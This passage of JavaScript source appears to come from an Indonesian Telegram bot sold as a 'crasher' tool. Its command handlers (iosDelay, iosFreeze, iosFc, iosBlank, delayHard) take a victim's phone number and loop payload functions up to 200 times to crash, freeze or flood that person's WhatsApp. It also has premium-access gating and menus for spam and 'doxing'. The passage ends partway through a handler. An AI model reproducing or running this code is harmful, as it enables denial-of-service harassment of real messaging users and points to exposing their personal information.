〢-╰➤ ° ↯ ᴍʏ ʙᴇsᴛ ғʀɪᴇɴᴅ
┃☰. @sixcnf
〢-╰➤ ° ↯ ᴍʏ ʙᴇsᴛ ғʀɪᴇɴᴅ
┃☰. @Mekinjir
〢-╰➤ ° ↯ ᴍʏ ʙᴇsᴛ ғʀɪᴇɴᴅ
┃☰. Xatanical
〢-╰➤ ° ↯ ɪᴅᴏʟᴀ
┃☰. Ota
〢-╰➤ ° ↯ ɪᴅʟᴀ
┃☰. Wolf
〢-╰➤ ° ↯ ɪᴅᴏʟᴀ
┃☰. Takashi
〢-╰➤ ° ↯ ɪᴅᴏʟᴀ

⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫`;

const captionMenu = `✦••┈┈ ( 🫀 ) - 𝐄𝐱𝐳𝐲 𝐂𝐫𝐚𝐬𝐡𝐞𝐫𝐬 - ┈┈••✦
𖥊. -  ᴏᴡɴᴇʀ : @yteamlowhh
𖥊. -  ᴠᴇʀsɪᴏɴ : 𝟽.𝟶

✦••┈┈ ( 🍀 ) - 𝐒𝐭𝐚𝐭𝐮𝐬 𖣂 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 - ┈┈••✦
𖥊. - ᴍᴇᴍᴏʀʏ ᴘᴀɴᴇʟ : ${formatMemory()}
𖥊. - ʀᴜɴᴛɪᴍᴇ sᴄʀɪᴘᴛ : ${getBotRuntime()}
𖥊. - ᴘʀᴇᴍɪᴜᴍ sᴛᴀᴛᴜs : ${getPremiumStatus(0)}
𖥊. - ᴄᴏᴏʟᴅᴏᴡɴ sᴄʀɪᴘᴛ : 0 seconds

✦••┈┈ - 𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐒𝐜𝐫𝐢𝐨𝐭 - ┈┈••✦
𖥊. - /addowner => ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ ᴏᴡɴᴇʀ
𖥊. - /delowner => ᴍᴇɴɢʜᴀᴘᴜs ᴏᴡɴᴇʀ
𖥊. - /addadmin => ᴍᴇɴᴀᴍʙᴀʜᴋᴀ ᴀᴅᴍɪɴ
𖥊. - /deladmin => ᴍᴇɴɢʜᴀᴘᴜs ᴀᴅᴍɪɴ
𖥊. - /addprem => ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ ᴘʀᴇᴍɪᴜᴍ
𖥊. - /delprem => ᴍᴇɴɢʜᴀᴘᴜs ᴘʀᴇᴍɪᴜᴍ
𖥊. - /setcd => ᴍᴇɴɢᴀᴛᴜʀ ᴄᴏᴏʟᴅᴏᴡɴ
𖥊. - /addsender=> ᴍᴇɴᴀᴍʙᴀʜᴋᴀɴ sᴇɴᴅᴇʀ
𖥊. - /listbot => ᴍᴇʟɪʜᴀᴛ sᴇɴᴅᴇʀ ᴀᴋᴛɪғ
⧫━⟢ 𝐓𝐞𝐫𝐢𝐦𝐚 𝐊𝐚𝐬𝐢𝐡 ⟣━⧫`;


async function sendWithMedia(chatId, caption, parseMode, replyMarkup) {
  const media = userMedia[chatId];
  if (!media || !media.type) {
    return bot.sendPhoto(chatId, getRandomImage(), { caption, parse_mode: parseMode, reply_markup: replyMarkup });
  }
  const mediaObj = getMediaByType(media.type);
  if (mediaObj.type === 'photo') {
    return bot.sendPhoto(chatId, mediaObj.stream, { caption, parse_mode: parseMode, reply_markup: replyMarkup });
  } else if (mediaObj.type === 'video') {
    return bot.sendVideo(chatId, mediaObj.stream, { caption, parse_mode: parseMode, reply_markup: replyMarkup });
  } else if (mediaObj.type === 'gif') {
    return bot.sendAnimation(chatId, mediaObj.stream, { caption, parse_mode: parseMode, reply_markup: replyMarkup });
  } else {
    return bot.sendPhoto(chatId, getRandomImage(), { caption, parse_mode: parseMode, reply_markup: replyMarkup });
  }
}


bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username ? `@${msg.from.username}` : "User";
  stopDisco(chatId);
  
  userMode[chatId] = null;
  userMedia[chatId] = null;
  userFormat[chatId] = null;
  userBase[chatId] = null;

  const colorMenuKeyboard = {
    inline_keyboard: [
      [{ text: "mᴇʀᴀʜ", callback_data: "color_red",style: "danger" }, { text: "ʜɪᴊᴀᴜ", callback_data: "color_green",style: "success", icon_custom_emoji_id: "5244685720215379209" }],
      [{ text: "ᴋᴜɴɪɴɢ", callback_data: "color_yellow",style: "danger", icon_custom_emoji_id: "5244685720215379209" }, { text: "ᴅɪsᴄᴏ", callback_data: "color_disco",style: "success", icon_custom_emoji_id: "5244685720215379209" }]
    ]
  };

  await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `<b><blockquote>⏤ ( 🍂 ) — こんにちは ${username}</blockquote>
    
最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ @yteamlowhh

⫹⫺ Pemilik : @yteamlowhh<tg-emoji emoji-id="5447249559149367631">🌲</tg-emoji>
⫹⫺ Support : All Buyer Gw<tg-emoji emoji-id="6098375676488848970">⭐</tg-emoji>
⫹⫺ Version : 𝟽.𝟶<tg-emoji emoji-id="6098239916867588854">👾</tg-emoji>

MOHON PILIH WARNA DI BAWAH INI</b>`,
    parse_mode: "HTML",
    reply_markup: colorMenuKeyboard
  });
});

bot.on('callback_query', async (query) => {
  try {
    const chatId = query.message.chat.id;
    const username = query.from.username ? `@${query.from.username}` : "User";
    const messageId = query.message.message_id;
    const senderId = query.from.id;
    const data = query.data;

    await bot.answerCallbackQuery(query.id);
    await bot.deleteMessage(chatId, messageId).catch(() => {});

    if (data !== "color_disco") stopDisco(chatId);

    // 1. PILIH WARNA
    if (data.startsWith("color_")) {
      userMode[chatId] = data;
      const mediaKeyboard = {
        inline_keyboard: [
          [{ text: "FOTO", callback_data: "media_photo",style: "danger", icon_custom_emoji_id: "5244685720215379209" }],
          [{ text: "VIDEO", callback_data: "media_video",style: "success", icon_custom_emoji_id: "5244685720215379209" }],
          [{ text: "GIF", callback_data: "media_gif",style: "primary", icon_custom_emoji_id: "5244685720215379209" }]
        ]
      };
      await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `<b><blockquote>⏤ ( 🍂 ) — こんにちは ${username}</blockquote>
    
最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ @yteamlowhh

⫹⫺ Pemilik : @yteamlowhh 🌲
⫹⫺ Support : All Buyer Gw ⭐
⫹⫺ Version : 𝟽.𝟶 👾

MOHON PILIH MEDIA DI BAWAH INI</b>`,
        parse_mode: "HTML",
        reply_markup: mediaKeyboard
      });
      return;
    }

    // 2. PILIH MEDIA
    if (data.startsWith("media_")) {
      const mediaType = data.split('_')[1];
      userMedia[chatId] = { type: mediaType };
      const formatKeyboard = {
        inline_keyboard: [
          [{ text: "Markdown", callback_data: "format_markdown",style: "danger", icon_custom_emoji_id: "5244685720215379209" }],
          [{ text: "HTML", callback_data: "format_html",style: "primary", icon_custom_emoji_id: "5244685720215379209" }]
        ]
      };
      await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `<b><blockquote>⏤ ( 🍂 ) — こんにちは ${username}</blockquote>
    
最新かつ最強レベルのシステムです。ぜひ体験してくださいこれこそ @yteamlowhh

⫹⫺ Pemilik : @yteamlowhh 🌲
⫹⫺ Support : All Buyer Gw ⭐
⫹⫺ Version : 𝟽.𝟶 👾

MOHON PILIH FORMAT DI BAWAH INI</b>`,
        parse_mode: "HTML",
        reply_markup: formatKeyboard
      });
      return;
    }

    // 3. PILIH FORMAT
    if (data.startsWith("format_")) {
      const format = data.split('_')[1];
      userFormat[chatId] = format;
      const baseKeyboard = {
        inline_keyboard: [
          [{ text: "TAMPILAN SIMPLE (3 tombol)", callback_data: "base_simple",style: "primary" }],
          [{ text: "TAMPILAN KECE", callback_data: "base_kece",style: "success" }]
        ]
      };
      await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `<b>Pilih tampilan base yang Tuan suka:</b>\n\n✅ Base Simple → Minimalis, cepat, 3 tombol utama\n✅ Base Kece → Elegan, detail, tombol lengkap`,
        parse_mode: "HTML",
        reply_markup: baseKeyboard
      });
      return;
    }

    // 4. PILIH BASE
    if (data === "base_simple") {
      userBase[chatId] = 'simple';
    } else if (data === "base_kece") {
      userBase[chatId] = 'kece';
    }

    if (data === "base_simple" || data === "base_kece") {
      const style = getUserStyle(userMode[chatId] || "color_green");
      const format = userFormat[chatId] || 'html';
      const rawCaption = getMainCaptionRaw(senderId);
      const finalCaption = (format === 'markdown') ? "```javascript\n" + rawCaption + "\n```" : rawCaption;
      const parseMode = (format === 'markdown') ? "MarkdownV2" : "HTML";
      const replyMarkup = buildKeyboard(style, userBase[chatId]);
      const sent = await sendWithMedia(chatId, finalCaption, parseMode, replyMarkup);
      if (userMode[chatId] === "color_disco") {
        startDisco(chatId, sent.message_id);
      }
      return;
    }

    // 5. SUBMENU & NAVIGASI
    let caption = "";
    let replyMarkup = {};
    let parseMode = (userFormat[chatId] === 'markdown') ? "MarkdownV2" : "HTML";

    if (data === "trashmenu") {
      caption = captionTrashmenu;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝕭𝖚𝖌𝕬𝖓𝖉𝖗𝖔", callback_data: "trashmenu2", style: "danger", icon_custom_emoji_id: "5900016133796270577" },
            { text: "𝕴𝖔𝖘𝕾𝖕𝖆𝖒", callback_data: "iosBugSpam", style: "danger", icon_custom_emoji_id: "5899970937855415658" }
          ],
          [ { text: "𝕬𝖓𝖉𝖗𝖔𝕯𝖕𝖆𝖒", callback_data: "AndroBebasSpam", style: "danger", icon_custom_emoji_id: "5884201802219393226" } ],
          [ { text: "𝕭𝖆𝖈𝖐", callback_data: "back_to_main", style: "danger", icon_custom_emoji_id: "5246844216159526816" } ]
        ]
      };
    } else if (data === "trashmenu2") {
      caption = getTrashmenu2Caption();
      replyMarkup = { inline_keyboard: [[ { text: "𝕭𝖆𝖈𝖐", callback_data: "trashmenu", style: "success", icon_custom_emoji_id: "5244685720215379209" } ]] };
    } else if (data === "iosBugSpam") {
      caption = getIosBugSpamCaption();
      replyMarkup = { inline_keyboard: [[ { text: "𝕭𝖆𝖈𝖐", callback_data: "trashmenu", style: "success", icon_custom_emoji_id: "5244871112478713158" } ]] };
    } else if (data === "AndroBebasSpam") {
      caption = getAndroBebasSpamCaption();
      replyMarkup = { inline_keyboard: [[ { text: "𝕭𝖆𝖈𝖐", callback_data: "trashmenu", style: "success", icon_custom_emoji_id: "5244741447416044165" } ]] };
    } else if (data === "menuTools") {
      caption = captionMenuTools;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝕲𝖗𝖔𝖚𝖕𝕸𝖊𝖓𝖚", callback_data: "groupMenu", style: "danger", icon_custom_emoji_id: "5247148896844537294" },
            { text: "𝕯𝖔𝖝𝖎𝖓𝖌𝕸𝖊𝖓𝖚", callback_data: "Doxing", style: "danger", icon_custom_emoji_id: "6098239916867588854" }
          ],
          [ { text: "𝕿𝖔𝖔𝖑𝖘𝕿𝖜𝖔", callback_data: "ToolsTwo", style: "primary", icon_custom_emoji_id: "6312312674721996058" } ],
          [ { text: "𝕭𝖆𝖈𝖐", callback_data: "back_to_main", style: "primary", icon_custom_emoji_id: "5870920625173828356" } ]
        ]
      };
    } else if (data === "groupMenu") {
      caption = captionGroupMenu;
      replyMarkup = { inline_keyboard: [[ { text: "𝕭𝖆𝖈𝖐", callback_data: "menuTools", style: "danger", icon_custom_emoji_id: "6098375676488848970" } ]] };
    } else if (data === "ToolsTwo") {
      caption = captionToolsTwo;
      replyMarkup = { inline_keyboard: [[ { text: "𝕭𝖆𝖈𝖐", callback_data: "menuTools", style: "primary", icon_custom_emoji_id: "6098430411552068356" } ]] };
    } else if (data === "Doxing") {
      caption = captionDoxing;
      replyMarkup = { inline_keyboard: [[ { text: "𝕭𝖆𝖈𝖐", callback_data: "menuTools", style: "success", icon_custom_emoji_id: "5361568011020942276" } ]] };
    } else if (data === "TqTo") {
      caption = captionTqTo;
      replyMarkup = { inline_keyboard: [[ { text: "𝕭𝖆𝖈𝖐", callback_data: "back_to_main", style: "primary", icon_custom_emoji_id: "5875221455100187377" } ]] };
    } else if (data === "menu") {
      caption = captionMenu;
      replyMarkup = { inline_keyboard: [[ { text: "𝕭𝖆𝖈𝖐", callback_data: "back_to_main", style: "danger", icon_custom_emoji_id: "5875330306751336929" } ]] };
    } else if (data === "back_to_main") {
      const style = getUserStyle(userMode[chatId] || "color_green");
      const format = userFormat[chatId] || 'html';
      const rawCaption = getMainCaptionRaw(senderId);
      const finalCaption = (format === 'markdown') ? "```javascript\n" + rawCaption + "\n```" : rawCaption;
      const parseModeMain = (format === 'markdown') ? "MarkdownV2" : "HTML";
      const replyMarkupMain = buildKeyboard(style, userBase[chatId] || 'kece');
      const sent = await sendWithMedia(chatId, finalCaption, parseModeMain, replyMarkupMain);
      if (userMode[chatId] === "color_disco") {
        startDisco(chatId, sent.message_id);
      }
      return;
    } else {
      return;
    }

    const finalCaption = (userFormat[chatId] === 'markdown') ? "```javascript\n" + caption + "\n```" : caption;
    await sendWithMedia(chatId, finalCaption, parseMode, replyMarkup);

  } catch (err) {
    console.error(err);
  }
});

    
//=======CASE BUG IOS BEBAS SPAM=========//
bot.onText(/\/iosDelay (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/iosDelay"] === true) {
    return bot.sendMessage(chatId, "❌ Command /iosDelay sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/unlock /iosDelay`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `BUY AKSES DULU SONO SAMA IKKY IMUT`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/yteamlowhh", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`js
# 𝙋𝙍𝙊𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : IOS DELAY
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 200; i++) {
      await FaiqForclose(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`js
# 𝙎𝙐𝙆𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : IOS DELAY
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/iosFreeze (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/iosFreeze"] === true) {
    return bot.sendMessage(chatId, "❌ Command /iosFreeze sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/unlock /iosFreeze`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `BUY AKSES DULU SONO SAMA IKKY IMUT`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/yteamlowhh", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`js
# 𝙋𝙍𝙊𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : IOS FREEZE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 60; i++) {
      await EfceClick(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`js
# 𝙎𝙐𝙆𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : IOS FREEZE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/iosFc (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/iosFc"] === true) {
    return bot.sendMessage(chatId, "❌ Command /iosFc sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/unlock /iosFc`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `BUY AKSES DULU SONO SAMA IKKY IMUT`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/yteamlowhh", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`js
# 𝙋𝙍𝙊𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : IOS FC
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 60; i++) {
      await EfceClick(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`js
# 𝙎𝙐𝙆𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : IOS FC
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/iosBlank (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/iosBlank"] === true) {
    return bot.sendMessage(chatId, "❌ Command /iosBlank sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/unlock /iosBlank`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `BUY AKSES DULU SONO SAMA IKKY IMUT`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/yteamlowhh", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`js
# 𝙋𝙍𝙊𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : IOS BLANK
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 60; i++) {
      await EfceClick(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`js
# 𝙎𝙐𝙆𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @yteamlowhh
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : IOS BLANK
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

//==== CASE BUG ANDRO NO SPAM =====//
bot.onText(/\/delayHard (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  
    if (commandLocks["/delayHard"] === true) {
    return bot.sendMessage(chatId, "❌ Command /delayHard sedang dalam keadaan *OFF* (terkunci).\nSilakan minta owner untuk membukanya dengan `/unlock /delayHard`", { parse_mode: "Markdown" });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "BUY AKSES DULU SONO SAMA IKKY IMUT",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/yteamlowhh" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Kirim foto dengan caption proses (tombol merah)
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
# PROSES KIRIM BUG

◇ OWNER : @yteamlowhh
◇ PENGIRIM BUG : @${msg.from.username || "unknown"}
◇ EFEK BUG : DELAY HARD
◇ KORBAN : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
      },
